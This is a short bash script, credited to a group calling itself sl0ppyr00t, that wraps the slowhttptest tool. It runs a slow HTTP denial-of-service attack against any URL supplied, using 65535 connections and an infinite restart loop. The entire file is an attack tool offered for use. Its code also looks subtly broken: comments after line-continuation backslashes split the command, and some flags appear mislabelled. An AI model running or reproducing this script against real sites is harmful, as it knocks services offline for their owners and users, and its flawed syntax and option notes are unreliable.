#!/bin/bash
#
# Enhanced Sl0ppy - l7-read
# Team sl0ppyr00t
# x0xr00t

# Validate URL input
if [[ -z "$1" ]]; then
    echo "Usage: $0 <URL>"
    exit 1
fi

url="$1"

# Function to execute the slow read attack
function run_slowhttptest {
    echo "[*] Initiating slow HTTP read attack against $url..."

    slowhttptest \
        -R \                       # Read attack
        -u "$url" \                # Target URL
        -c 65535 \                 # Concurrent connections
        -r 5000 \                  # Connections per second
        -k 15 \                    # Keep-alive requests per connection
        -p 1000 \                  # Receive window (in bytes)
        -m accept \                # Accept responses
        -l 1800 \                  # Duration in seconds (30 minutes)
        --no-progress-bar
}

# Infinite loop to repeat the test
while true; do
    run_slowhttptest
    echo "[*] Test iteration completed. Restarting in 5 seconds..."
    sleep 5
done
